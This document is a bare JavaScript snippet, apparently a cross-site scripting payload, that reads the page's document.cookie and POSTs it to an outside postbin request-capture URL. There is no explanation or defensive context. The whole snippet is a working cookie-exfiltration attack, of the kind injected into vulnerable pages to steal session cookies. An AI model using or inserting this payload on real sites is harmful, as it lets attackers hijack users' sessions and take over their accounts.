

var xhr=new XMLHttpRequest(); 
xhr.open("POST", "https://www.toptal.com/developers/postbin/1643452826051-2289256423246"); 
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.send('cookie=' + document.cookie);